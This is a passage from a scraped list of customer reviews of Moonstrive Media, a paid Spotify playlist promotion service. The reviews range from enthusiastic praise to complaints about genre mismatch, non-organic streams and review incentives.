It feels good to be heard!', \"Excellent company and customer service: Excellent company and customer service. Totally depends on the song however; don't believe any song can be success. This company does everything it can to make it happen.\", \"A little disappointed: I was a little disappointed in Moonstrive's performance, but perhaps this is just the nature of playlisting as a means of promotion. On the face of it, you could be mistaken for seeing their promise of placing you on playlists with 100,000 listeners in an overly optimistic light, and see their guarantee of 1000-15,000 streams and expect yourself to be coming towards the top of this rather wide minimum guarantee. In our 4 week placement we got 3300 streams from being placed on 4 playlists with a total of 141926 followers. These playlists gave us only 2.33% streams to listener ratio, so they're not super-active lists, although this is all within the lower end of what they promise to achieve on their site if you read the offer closely. I found that the largest playlist was the most disappointing, only 352 streams from a playlist with over 100,000 followers (that's 0.33% of followers listening, and without this list they would have fallen way below their 100,000 followers promise). The playlist itself was the Soundtrack for a computer game which was mostly composed by the band Daughter. I have to question whether this is a good playlist to place anyone on - if I'm listening to a soundtrack playlist I'm not going to be interested in songs that were not on that soundtrack.I guess this kind of placement, and looking at the artists on the other three lists, suggests Moonstrive weren't quite sure what to do with our genre. So these 3000 streams will come from a wide range of people, and be quite unlikely to gain us any further organic streams. We didn't grow our followers at all, and I ultimately regret using the service. Moonstrive imply that they're highly targeted for any genre and that they are likely to improve other stats because their playlists are not bots and 'help to trigger the Spotify algorithm'. This simply was not the case in my experience but it did teach me to avoid playlist promotions in future. Unless they are highly targeted to very genre specific lists with active listeners seeking new music it's all a bit pointless, unless you just want vanity streams to make your profile look good. If that's what you're after you could go much cheaper and get bot listeners from another service as it will do you just as much good (based on my experience and music in the indie rock/alternative genre).\", 'Great company with legit audience', 'Great Service: Great Service! they delivered what they say they were going to deliver,  I got a decent amount of new subscribers to my Spotify and if I had questions they answered promptly and were very professional with their replies. It made all the difference in the world.

This is not a scam or some dodgy fly-by-night operation. Our song was placed on active, human-populated playlists and received tons of listens. The downside is that the SEO playlisting they offer is not really optimized for genre, and so there was some mismatch. The end result was a lot of streams (not enough to cover the cost of the promotion because Spotify) but not a lot of follows or saves relative to the number of listeners. So be aware of this going in. If you are making very mainstream music, your results might be better in this regard.

Also, the listens came through in a batch run i.e nothing most of the day and then like clockwork at the same time each day, hundreds would go through. Anyone with any common sense could see they were not organic listens. My song has been on the spotify algorithmic playlists for 4 months with over 80k streams and 3k+ of both saves and views - remember the order received ZERO saves or views.I love the very sincere and professional response they made, trying to gaslight me. No, that is not the last communication I sent. That was the email before the order started. My last email explained in full why I believe your listens are not organic. You tried to get trustpilot to not approve my review, but after I sent them all my supporting evidence... Well it still being here speaks for itself.How could I tell my analytics were accurate, well pretty straight forward, you told me the names of the playlists I was on and at the time I had no promotions going nor was I on Spotify algorithm playlists. So... all the stats were from my order with you.lol oh and I had live update going.Why did I wait 6 months to write my review. You may find it hard to believe but this is not a huge priority in my life. However, as recently my social media is clogged with your Ads, I thought I should take the time to write a review, even if it saves a few ppl.Finally, id would like to address anyone thinking of engaging their services, If you don't mind not getting organic listens and happy to have your listen count inflated to boost your ego or show people you're more successful then you are, then this gig may still be ok for you.\", \"Great results and easy to use: I’ve used Moonstrive Media several times now for Spotify and will keep using them. This time I went for the 500k package (I’ve used the 250k each time before) and it was really great. Streams, monthly listeners and followers all increased very significantly. I like that they use a very wide range of playlists in different countries but always within genre (pop). The service is always easy to use and trustworthy. I've used other promotion services in the past, a couple with very good results but overall, I prefer Moonstrive.\", \"More plays = more chances for saves & followers: Moonstrive has a simple mission that they do very well. They place songs on a list of very active playlists. No service can guarantee how many listeners will like your music - that's on the artist - but Moonstrive can honestly report that you will get the plays. If you have access to analytics on Spotify, you can verify it, as I did.\", \"Good results: The campaign reached good results and the playlists are legit.

But overall good cost-benefit!\", 'This was my first time trying a…: This was my first time trying a playlisting service. My experience is that the service is quite effective. Very effective, actually. I got a lot of streams and according to the artist.tools they were legit playlists. And, the stats on Spotify backed it up. No weird stats that pointed to bots. So, you\\'re getting real listeners. For me, however, I ended up pulling my song down early as I wasn\\'t really a fan of the list I landed on. My tune was more in the Radiohead OK Computer realm...and I landed on a playlists with stuff like Elvis, Chuck Berry, ZZ Top, and AC/DC. I was worried this would mess up my \"Fans also like\" info, so I asked them to remove my song. I\\'m going to try again with my next song to see if maybe I land on a list with some more appropriate artists. Customer Service here is also pretty fantastic as they responded to my request pretty quickly and without issue.', 'By far the most effective playlist promotion …: By far the most effective playlist promotion service I have tried so far. 50k+ streams for a 4 week promotion was pleasing to see. Some playlists were a tad random and the location of the listeners on those playlists were from a very specific region (South America in this instance) but I saw an uptick in saves and playlist adds due to the campaign. My only reason for not giving 5 stars is due to the cost of the package vs how much the estimated royalties are worth. It would be unfair to expect to make 100% of the cost back but in my case it is probably under 50% which means you have to be willing to take an overall loss and hope it grows your audience. Very happy though and will definitely be using again on future campaigns.', \"We recently tried Moonstrive Media…: We recently tried the Moonstrive Media playlisting service to promote our music, and I'm thrilled with the results. They delivered the numbers we paid for, exceeding our expectations. The team curated targeted playlists that matched my genre, resulting in a significant increase in streams, monthly listeners, and followers. Their transparency, adherence to Spotify guidelines, and personalized approach make them an excellent choice for any artist looking to expand their reach on Spotify.\", 'Very good results overall: Very good results overall.

I purchased the 100K followers package and we received over 2700 streams within the 4 weeks. Engagement wasn’t amazing but we still gained a decent amount of followers, and listeners also saved the song, so the service is definitely legitimate. The track was also uploaded within 24 hours of submission and I received a detailed PDF explaining which playlists the song was placed on and how many followers each playlist has etc. Overall my experience was very positive. I was very happy with the results. 100% recommend moonstrive to anyone and will be sure to use their services again in the future.', 'Brilliant: Brilliant!

Quickly!', 'very positive experience! good genre fit, solid results: Good experience! Ended up on 4 playlists, each with a broad but still appropriate genre fit. Our song was a noisey alt rock / post punk song and was put on the playlists \"Biker Music Rock Songs,\" Notion Vibes,\" \"AC/DC - Best Rock Songs\" and \"American Pie Playlist.\" I purchased the 100k Playlist Followers package, and after 4 weeks the song accumulated 1,789 streams from those 4 specific playlists, which is pretty solid for the price. There seemed to be a radio bump for the track during this time, but I\\'ve been using a few different promo services over the past month, so it\\'s hard to tell if this bump was from the Moonstrive playlists or not - regardless, I am sure they helped! The team was also incredibly speedy, accepted our track and had us added to the playlists within 24 hours.

All around this was a very positive experience!', \"My first time using Moonstrive…: This was my first time using Moonstrive Media and the results were fairly good. Through the playlists my song received a little over 1000 streams (which is on the low side that they estimate) however, my music IS very niche so it wasn't totally surprising.  I'm happy to get the ball rolling with those 1000 streams. I think my only real criticism is that the playlists weren't exactly specific to my genre ( which is often the case with other playlist promotions I've come across since again, my genre is dark and niche).  In the end I would use and will use their services again for future releases.\", 'Awesome!: Great service and excellent results. Looking forward to partnering again soon!', \"We've used Moonstrive for 3 consecutive…: We've used Moonstrive for 3 consecutive campaigns and have been pretty pleased with the results.  It boosted our numbers with real listeners, got some saves and a few new followers, and boosted the Radio playlist algorithm on Spotify.  We used one of the more affordable packages as our budget is small, but still got decent results.  When we weren't getting good results on a playlist, I reached out and they moved our song to another one that did better for us.  Good customer service and we will be using them again.\", 'Best playlist company I\\'ve found so far: I\\'ve tried six playlist companies in the past year and Moonstrive is the only one I will use again (and have used them three times already). I\\'m new to this world of music promotion, so wanted to try small campaigns with several companies to see how it went. A couple companies didn\\'t provide good results at all, a couple seemed to be using bots and another looked legit but only had streams in South America, which isn\\'t my target audience. Going forward, I will mostly use social media for promotion, combining my posts with advertising, but will continue using Moonstrive to help my Spotify numbers grow and reach more people. I\\'ve gone from 0 streams, 0 followers to 140k streams and 400 followers in six months. At the end of the Moonstrive campaign, when my song is removed from playlists, the streams numbers drop significantly as you would expect, but I still see listens everyday that I believe come from listeners of the playlists I used to be on that saved my songs or added to their own playlists. I\\'ve used Moonstrive to find playlists for 3 songs and each experience was good. The playlists my songs were put on didn\\'t seem the best to me at first (for example \"Rock and Roll Classics\"), but the results are better then any other company and I\\'m confident the listeners are real (spent a lot of time looking at each playlist my songs were place on to see the history). It\\'s hard to know for sure, but my Instagram followers have increased quite a bit too and I wonder if that is coming from folks that found me on a playlist.I\\'ve learned it\\'s a bad idea to spend a whole promotion budget on a playlisting service, but it can help a bit and is worth it if you have the money to spend. I think of it as covert advertisement - my songs aren\\'t advertisements per se, but when someone is listening to great songs and then my song is played, that is my chance to win over a fan. It\\'s not going to happen every time of course, but my song wouldn\\'t have reached the ears of that music fan at all if I hadn\\'t done the promotion. One thing I don\\'t love is that they are not based in the USA, so when I pay them my bank charges an International Service fee (1%). Maybe it\\'s just my bank, I\\'m not sure... Not a huge deal, just a little annoyance.

Janik did seem a little bit defensive about this which is why I gave Moonstrive a 4 rather than 5 rating.', 'I’ve used Moonstrive for 3 promotions…: I’ve used Moonstrive for 3 promotions and gotten the best results from any other playlisting platform. I would still recommend using a small Facebook ads budget in addition to running playlists always so ensure long term follower growth & sustainability. I found them from a YouTuber I really trust and they do deliver.', 'Moonstrive Provides a great honest…: Moonstrive Provides a great honest service.

Bach where the lead instrument is banjo, and they found some playlists that were interested in it.', 'I liked moonstrive media it was a great…: I liked moonstrive media it was a great experience.I am still having streams even after the promotion.It is a great service and I would recommend it.', \"This is my honest review on Moonstrive…: This is my honest review on Moonstrive Media, I have used them for sometime now and I plan to continue using them, it isn't easy to find legit promoters who do right and put you on genuine playlists that are not botted, at the same time communicate with you respectfully and take feedback. If you are looking for their playlists to make you the next big thing or to make a lot of revenue then you don't know how promotion works and I don't think they are for you, but if you need legit steady plays and listeners from a diverse set of countries then I can assure you they are good at what they do. Some playlists that they added my song on did not fit the genre but they were very communicative to help sort it out.They don't make big or false promises which is important for an indie artist but they do their best which to be honest I feel will only get better as they gain more playlists that fit a number of genres.I plan on using their service continuously and hopefully they continue to get better.\", \"Great service: Great service, on time and works as expected. Can't complain.L.\", \"Great customer service: Moonstrive does a great job getting streams for sure, but where they really excel is in customer service.  We used their service twice, and after the first package we were a little unsure about the playlists we were on.  We weren't sure if they were the best fit, so we reached out to Moonstrive and asked about their selection process and they responded very quickly, and were very friendly and helpful.  This responsiveness is why we decided to use their service again and we are very satisfied with the results!\", 'Great experience: Great experience. Very responsive and quick service.', 'Excellent results: Excellent results. Will be returning', 'Please advertise what you really sell: Look, I’m not saying you haven’t helped get me in front of more listeners but your Facebook advertising does not sell you. You show these people getting streams but then when you look that profile on Spotify you only see 100 listeners from all those streams. Understanding that only 1% to 2% of people May return to listen to you again to your music but you make is seem that people will get famous overnight which to me is discouraging me from using you again. 5000 streams on YouTube May get me 30 likes which results in return listeners.  3000 streams in a month May get you 20-100 return listeners every so often. Honestly you spend more than you get for the long haul but advertising cost is about the same if not more which is exactly what you are. My main complaint is that I don’t think your playlist choices are always the best and honestly repetitive for songs that are totally different. I think you should allow the customer to choose the playlists that they think they would do best on. After all it is their song. Also it only helps a little to have people playing your songs in other countries as I can’t go and play for them. So maybe let people also choose where they want there songs to stream if that’s even possible. Understand I root for the underdog because I am one and you may crush more dreams than help if your advertising claims these “great” results. It takes more than a  1,000,000 dollars to make a person famous for a major label. Look it up. So a couple hundred or thousand will only take you so far. Your advertisements may work but is it really saying what your selling? If you think it does then your just like the rest of these guys.', 'I’m surprise with the good real results I’ve gotten: I tried a lot of companies already and normally I’m quite dissatisfied with the final results. But with Moonstrive media I got what they promised. They are good and will give you real listeners. One of the best playlist pitching companies I have work with. They are serious and you can trust you’ll get only real numbers from people actually listening to your music. Of course a lot of them will be passive listeners (studying, drinking something in a coffeeshop and so on) because of how the seo playlists are optimized (feelings, situations) but you’ll get for sure some real fans and this from my point of view is like gold. I’ll pitch with them again for sure.', 'This has been the first playlist…: This has been the first playlist service to appear to organically increase algorithmic streams. Very glad to have fallen upon this.', \"In a world....: [Deep, movie-preview, VO] In a world where Spotify playlist promoters use sketchy automated methods to fulfill their paid-for promises, a hero arises.  Which is Moonstrive Media.  My experience was great, they put my track on a very popular playlist and it got tons of streams.  Not a lot of followers from it though, but I'll own that (my track wasn't brilliant).  That said, the followers I did get from it seem all the more legit because of it. You don't want Spotify pulling your tracks because of dodgy bot behavior.  You want real live people who hear your tracks and want more. You want what Moonstrive provides.\", \"Finally a good playlist promotion service: I've used a few playlist promotion services in the past and the results have generally been poor. I heard about Moonstrive after a couple of bloggers and YouTube channels I follow and respect said that it was a service worth trying. I've now run two campaigns with Moonstrive and have been happy with the results of each. I would happily use them again.\", 'Another great campaign: Another great campaign. The team are incredible, friendly and supportive! Superb. Will be back. Thank you Moonstrive!', 'As an independent band we are Very…: As an independent band we are Very happy with the outcome of our first Spotify playlist campaign.

One of the few companies that are not botting streams/doing fake streams.', \"I thought I would try Moonstrive Media…: I thought I would try Moonstrive Media after doing a little research and recommendations and only wanted to use a genuine company no bots . I'm now on my 3rd campaign and I would highly recommend them to any artist trying to get their songs exposed to real listeners. Happy with the results Streams and saves. Mark\", 'Finally a serious playlisting company: I ordered two times at moonstrive media for spotify promotion. The promised stream count was 1000-15000 plays in 4 weeks.I was placed in 4 playlists and got around 3700 streams.When I noticed that some of the playlists are not that fitting for the song, I wrote the support and they were really friendly and flexible for my request. I got placed onto another playlist that fitted better.For the second time, I had the same issue, that the playlists were not 100% in thegenre of the song (this is what is not guaranteed but many artists would prefer this tbh),again the support was very obliging and suggested me other playlists, that mysong could be placed on. When the promised follower count did not fullfill the 100k followers,that were promised in the package, I received a generous refund.Moonstrive is one of the serious playlisting agencys out there. The playlists are grown organically and these are real listeners. I can only recommend and will orderagain from them.', 'Spotify Promotion: Seeing our songs being played on Spotify was our objective and Moonstrive Media has made that possible.', \"Best playlist promotion service I've…: Best playlist promotion service I've used!\", 'Moonstrive Really Works: Moonstrive is a good playlisting company. I have gotten honest results from their playlisting campaigns. Currently on my 3rd campaign with them. I highly recommend them as an integral part of a music promotion strategy.', 'Great experience with Moonstrive: I promoted a \"retro pop\" song through Moonstrive Media recently. They promoted the song on three genre-appropriate playlists on Spotify. The playlists totaled about 150,000 followers. At the end of the promotion I had about 4000 streams. The song was saved quite a few times as well. I was happy with my experience and would have no problem using them again.', 'I tried several promo services but…: I tried several promo services but Moonstrive was the only one that was able to help my very hard-to-place track land in some very big playlists. Would definitely recommend!', \"Highly Recommended - An Excellent Tool for Growth: I am very satisfied with the service provided by Moonstrive Media. My band has promoted two songs with them and will soon be starting our third. Our music is mostly hard rock and blues and we are from the United States. The song we are currently promoting is getting 500-800 daily streams, dozens of independent playlist adds from other curators, and a handful of saves each day. Our Spotify page had about 60 followers starting out and now we have nearly 200 after promoting two songs. Some days we get a bunch of new followers, other days we don't get any. The best part of this experience is all of our older songs are getting streams too, meaning that these listeners are taking the time to dive into our older content (does that sound like something a bot would do?). The streams are coming in from over 90 countries and spread out pretty well among them. Our top performers are the United States and Germany. I have used one other playlist service before and pretty much all of the streams only came from one country, which wasn't really ideal. I find Moonstrive to be fairly priced and has changed our entire outlook on utilizing Spotify to promote our music. Our first song we promoted with them continues to still get a decent amount of daily streams, saves, and playlist adds even though the campaign ended two weeks ago. I think that the diversity in countries that the streams come from, the continuing success of songs even after your campaign ends, and our other songs getting streams because listeners are diving into our older content are what make Moonstrive so great and safe to use. The results we are getting are also translating into other areas of success as well. Since promoting these songs, we have had independent playlist curators reach out to us for interviews, blogs do write ups of our songs, and our social media following increases a bit each week. We also run Facebook ads for the first two weeks of a song coming out, but Moonstrive is the main promotion tool we use for the next few weeks. I would feel comfortable crediting Moonstrive for the results that we see on social media and in other areas. Think of this as an investment in not only streams, but overall growth that spreads across other areas where you might have a presence. I also really like that Moonstrive can get your campaign running quickly depending on if you get it to them early in the day on a business day. We released a song on a Friday, I submitted the song to Moonstrive early that morning and they had it playlisted by lunchtime. This is really helpful for making sure you have a good launch on release day. The only complaints I would have are very minor. I would like to see the amount of listeners that convert into followers be higher, but I also understand that this completely depends on how good your song is and that Moonstrive can't force anyone to do anything. They can only put the content in front of the potential audience and then it is up to that listener to decide if they are a fan or not. I think the playlists that our songs are placed on by Moonstrive make sense for the most part, but occasionally there can be an odd placement. For instance, our last song was more of a chill indie-pop song and it was placed on a Biker Music playlist. We have plenty of songs that bikers would like, it just wasn't that one. Still, we got great results and I can tell that the staff at Moonstrive actually listen to the song before deciding where to place it and they are accurate in their placements the majority of the time. I look forward to running many more campaigns with Moonstrive. Not only for our new music this year, but also our older songs that never really got any attention when they first came out. It's never too late to promote a song. At the end of the day, it all depends on the quality of your song, but Moonstrive is the most effective tool I've used to get that song in front of people who might become real fans. They do what they say they do, they get it playlisted quickly on release day, are fairly priced, and the song still gets some daily streams even after the promotion ends. Moonstrive is a solid investment and a permanent staple in our advertising strategy for the foreseeable future.\", 'Solid Service: Solid Service!

Although it is not targetted specifically, it is still generating passive streams on the track after the campaign has finished, I would only reccommend this to artists with a very broad genre appeal such as \"Rock\" or \"Dance\".Whereas it is not as efficient as facebook ads which bring in followers as much as it does listeners it should still suppliment a facebook ad campaign for social proof puproses.', 'Straight forward marketing with no…: Straight forward marketing with no specific guarantees which means your song will do as good as your song is.Easy user friendly process!Strongly recommend.', 'I received listeners from all over the…: I received listeners from all over the world which led to some saves and replays/ adds to their own playlists.

Their service is fast and effective and they have been able to get the songs I have sent them placed on various curators\\' playlists appropriate to the genre of music. In a marketplace riddled with bot and click farm generated playlists all claiming to be \"organic\" Moonstrive Media appear to be the genuine thing in placing songs on playlists with actual real listeners. A check on Spotify for Artists shows listeners are spread over a wide selection of cities and areas as opposed to a few mid population towns while the playlist streams also seem to trigger the Spotify algorithm to generate more plays on Spotify Radio. The streams/ listener/ saves ratio also appears to be about right for real listeners. So if you want to go the way of playlist placements to promote your music I would recommend. Obviously streaming/listener numbers vary according to how people react to your songs but I have been happy with the responses I have got compared to other comparable services.', \"Moonstrive Media Rocks!!: So appreciative of the promotion of my song.

Our listeners skyrocketed. If you’re looking for an effective and save playlist service to pitch your music, do moonstrive. Note: we are rock/blues rock/garage rock', 'Throughout the last year Moonstrive…: Throughout the last year Moonstrive Media has consistently delivered for us, placing our promoted releases on qualitative Playlists that have garnered significant exposure. Giving 4 Stars to allow Moonstrive room to improve from Great to Amazing.', 'Used many times: Used many times. Very great', 'Moonstrive placed my song in multiple…: Moonstrive placed my song in multiple playlists and it resulted in thousands of streams, as promised.  I have tried other services and this one seems the best overall (mind you it cost the most too so that may be a factor)', 'Good service and do what they say they…: Good service and do what they say they will - plays secured', 'You guys are amazing never let me down…: You guys are amazing never let me down great company thanks again I will always use you guys', 'I never worry when I use Moonstrive: I use this company for all my artists. They are reliable and professional.', 'Good way to increase your engagement…: Good way to increase your engagement and get some new fans', 'So good, that I went back again.: I\\'m just taking time out to wish the team at Moonstrive a belated Happy New Year and to thank you, once again, for the last promotion you guys did for The Eyes of Heisenberg with the single, \"Vampire Lullaby\" on Spotify.There was a massive (for The Eyes) amount of interest and traffic, and an upswing in the number of listeners, streams and remaining monthly followers.The track is still on several playlists, has had some radio airplay, and we\\'re really pleased to have invested in your promotions.Cheryl and I put the finishing touches to the latest single by The Eyes of Heisenberg just before Christmas, and sorted out the licence fee for the royalties to our version of Paul Simon\\'s \"Sound of Silence\".It\\'s a kind of \"What if Judas Priest had covered Paul Simon?\" vibe, but we think we\\'ve done a pretty good job, and it has been well received on Soundcloud, as well as having 27 plays on Amazing Radio.So, we\\'re thinking of putting it up for another promotion with you at Moonstrive to maximise our footfall and, hopefully, one day, The Eyes of Heisenberg might be a huge Spotify success.It will mostly be down to you, if we do.So thank you again.', '5 Star Legit Music Promotion!: Moonstrive Media gave me 5 star legit promotion of my music on legit well established playlists.  I am so very happy to have found a true music promotion company.', 'good service: good service, real streams. <3', 'Does what it says on the tin: Does what it says on the tin. A great service that is helping me connect with the right kind of playlists and fans. Quality over quantity.', \"Best Spotify promotion I've used: Friendly staff that reply quickly. Very reasonable prices compared to similar services. I've promoted two tracks so far and a reasonable amount of people have added my tracks to their playlist so the traffic hasn't stopped although it's not nearly as high as during the promotion. Quite a few people have shazamed my tracks as well.\", \"False Advertising.: I got a lot of people listening to my song but Moonstrive  media promised me 50K followers and I didn't get any. Not happy.\", 'They’re the real deal: They’re the real dealI have landed on a couple of Spotify algorithmic playlists since they started promoting for us.  My first stop whenever I put out new music!', 'Great experience: Great experience, they did exactly what they said.', \"wouldn't work with these guys: wouldn't work with these guys. Paid for a 50K Youtube campaign and the videos stopped at 5K and been the same for almost a month now and they stopped responding to our emails. Very disappointed with the service.\", 'Great service: Great service, excellent result! Thank you Moonstrive Media!', \"Absolutely Content: I've had two campaigns running on Moonstrive now, and i spend alot of time reviewing the services that have been offered to me. There are thousands out there that will scam you out of your money and even worse even hurt your process as an artist.Moonstrive is different, the process is clearly structured, i checked on the playlists i was added to and can say i'm happy to proclaim that Moonstrive is one of the handful of services i trust and will use in the future.\", 'Mixed experience: Three stars is 2/5, that is for me 40% satisfaction, which is not bad, but not perfect either. I have done more than 5 orders, which I would not have done if all was bad.Positives:- Some small playlists seems to be a very good performing. E.g. one classic rock 30k playlist was giving me the same number of steams as another 700k one I got a placement through a different promoter. After the tracks is dropped there were still plays from saves so the streams seems genuine.- Staff usually responds very quickly and willing to accommodate requests (until you post a non 5* review that is).Negatives:- There does not seems any classification of playlists by genre or mood. So my classic rock track almost ended up in a \"50 shades of grey\" playlist. I ended up going through all their playlists selecting the most appropriate ones, which is doing their job. By default most tracks tend to end up in an Asian OST playlist, which is not usually a suitable music genre. For promotion to have a long term effects, the track should be be pitched to a suitable genre playlist, not just any large playlist. So the company should try harder to identify the most suitable playlists. The need to approach them to switch playlists for more suitable ones is stressful and time consuming.- The 20% discount offered for an \"honest\" trustpilot review does not seem to apply to non-positive reviews like this. So the positive reviews written could be just to get the 20% discount. So removed one star for the lie.', 'Great company: Great company. About to be my 3rd promotion with them. I keep coming back', 'A very good Plattform for every starter…: A very good Plattform for every starter on Spotify. You get what you Pay for and its a pleasure to work with you Guys. I am an continuous Buyer and will always come back to your Service !', 'The service was excellent: The communication was excellent and clear! My track was placed in several suitable playlists and I received a sufficient number of auditions, and at the same time some listeners added my track to their own playlists. I will definitely use this service again!', 'Good Campaign: It was a very good campaign, good results good playlist adds very professional', 'Opportunity for Artists: Moonstrive Media offers artists an opportunity to have their music heard above the thousands of tracks uploaded to spotify daily!', 'Very Satisfied:: Very Satisfied:We have used Moonstrive for the past year and have had outstanding results month over month. We highly recommend them', 'Loved working with them: Loved working with them! Thanks again for the great promo!', 'This was a very good experience: This was a very good experience , the songs received a great number of plays . The playlists were a bit long but clearly popular . One might wish for a broader range of types of playlists , but the customer service has been exceptional . I would definitely recommend this group to anyone , who has material that fits their playlist !', \"Sent my song: Sent my song. Got playlisted with very genre specific playlists that were perfect my song. A couple of additional playlists from there which was great. Even after my promo ended, I'm still on some fan playlists that came from there.\", 'Moonstrive media is the real thing: At first i was slightly concerned that Moonstrive Media was another company that promised organic streams but did not deliver on that promise. But, thankfully i was completely wrong. My song was  played in many many countries around the whole world by thousands of streamers. Also the song was added to a few other personal playlists and saved by quite a few listeners. I was hoping for a few more followers though. However, one needs to be in the music game for the long haul and popularity comes with hard work and putting out good songs on a regular basis. Moonstrive Media levels the playing field and allows for little known artists to gain a foothold on what was previously a virtually impossible game for unsigned artists. I recommend using them, even just once to try it out. I for one will be going back to them with another song to promote.', 'The selected playlists were not genre…: The selected playlists were not genre specific and I did not gain a single Spotify follower. Minimal streams did occur. When I complained they responded to my complaint in a most profess manner and (quite appropriately) refunded me for the campaign. I did not get great benefit from my campaign, however I’m sure other genre artists (I am blues) may gain benefit.', 'HIGHLY RECOMMENDED: Very, very happy with this service. We used the Spotify 50k follower playlist promotion. In less than 4 weeks, our monthly listeners went from 600 to 15,000 & our song plays went from under 1000 to 20,000! We are absolutely running a second promo with these guys!', 'Moonstrive Media was very professional…: Moonstrive Media was very professional and did a great job.  I was very happy with the results and most importantly the customer service.', 'Very great service: Very great service, I saw real growth with real monthly listeners. I would highly recommend and use again ??', 'Awesome promotion but one thing I don’t…: Awesome promotion but one thing I don’t like about them is it seems like they don’t take the time to listen to the song they just go by album cover based I had to contact them twice about moving my song for the first two orders as my songs got placed in playlist with lots of followers but did not fall no where near the genre, I wish they could ask you a short survey what type of track your music falls on !', 'Absolutely seamless: Absolutely seamless , a perfect example of getting exactly what it says on the tin. Great set up.', 'First time: This is my first time working with Moonstrive. I feel got a good amount of plays for the money I paid. Will be working with them again', 'more than expected: Moonstrive media helped us reach many more listeners in other parts of the world than we normally reach with our music. We reached out to more than twice as many as they indicated we could expect from the package we purchased.', 'This company does a great job.', \"Excellent playlist: My song was placed in an excellent playlist. Perfect for that song. I would give them a five star except the placement was around 30. A lot of people don't listen to a playlist that long.\", 'Moonstrive Media have delivered three…: Moonstrive Media have delivered three fantastic campaigns and the results are proof of that.', 'Superb: Superb, seamless delivery of streams exactly as promised.', 'Great service: Promoted a single release. Ordering was easy and informative. Moonstrive delivered above promised - more streams than expected. This is one happy customer! ;-)', \"I've tried nearly a hundred playlisters and…: I've tried nearly a hundred playlisters and this is one of two that I submit to for every release.\", 'The company was very helpful and…: The company was very helpful and cooperative. They helped me find a playlist on YouTube that fit our music.  Initially, the fit was not perfect, but they responded ot my feedback and helped find a better fit.The promised number of plays were realized.', 'Top Tier: The turnaround on their services was next to instant and I couldn’t have been happier with the results. Emailing with the same one person afterwards to make sure I was happy was refreshing and setting up my next release on the same email chain was efficient.', \"This has been a great experience !!: This has been a great experience - I really feel like there's a true momentum happening with my music, steady growth & popularity!\", 'Moonstrive is great: Moonstrive is great! I have used them for a few Spotify campaigns now. I have tried many different services in the past, and unfortunately, discovered that most of them ended up being nothing but bots even though they had promised organic traffic. Not the case with Moonstrive. All traffic I got as a result of their campaign was organic. Moonstrive is awesome!', 'This company is five Gold stars: This company is five Gold starsTreated me like a human not a number With lots of respect  and very professional Answered all my questions Very informative on what would happen  where my song would beAnd stayed in touch will use moonstone media for l my music', 'So far so good everything no complaints', 'Amazing and very professional', 'Regret it tbh: Listen, they will get you streams, but they will not be meaningful streams. And what I mean by that, is the playlists you get on & the streams you will get, will not translate into followers because the playlists have nothing to do with your tracks.My track was added to 3 playlists — a French playlist, a love song playlist (which the song is not), and a random Korean Drama Soundtrack playlist (which this song is obviously not a part of a soundtrack).If anything I honestly regret using this service because it has messed up my analytics and now it’s difficult to really see my actual. target audience in my stream data.I would much rather pay to be put on small, but targeted and meaningful playlists that may generate one or two actual followers and fans, than random playlists that will only mess up your important analytical data and will not translate into a broader fan base.', 'As soon as I signed up with Moonstrive…: As soon as I signed up with Moonstrive I saw immediate results, this company works, I will work with them again and again.', 'What a great service!: We received so many plays for our new release! Shocked at the success!! Will use again.', 'Awesome results!: I was super happy with the results I saw from my Spotify promotions with Moonstrive Media. They were able to put my songs on playlists which fit their genre and feel much more than other services I\\'ve used. I make children\\'s music, and I was really happy to see that they promoted my songs on playlists made for kids instead of general playlists like \"feel good,\" etc. Five stars for sure. I\\'d definitely recommend them, and I plan on using them again.', 'Great!: very easy to setup a campaign and great results. Highly recommended!', \"I'm so happy to have found these guys: I'm so happy to have found these guys.  Been trying multiple sources the last year and some are decent, others end up being bot streams.  This is the first company to communicate with me in a meaningful way during campaigns and to respond quickly. If you are like me and were worried about getting real streams, then I highly recommend these guys.\", 'One of the few that are REAL & deliver!', \"Everything went well: Everything went well. Don't have any issue with related caimpaign.\", 'The service did as expected: The service did as expected, received real organic growth and listeners. And songs were placed on playlist with promised amount of followers. The outcome was worth the money. One thing I would of preferred... instead of being thrown on just 1 playlist with the set amount of followers, wish they could of placed me on a few different playlist totaling the amount of promised followers. 1 song didn’t get nearly as much traffic as the rest of my songs. Because the following wasn’t as active. I feel if they broke it into multiple playlist that issue wouldn’t have been present. But all in all, that’s how organic growth works. They can’t promise a certain outcome. Will definitely use again in the future.']\n",
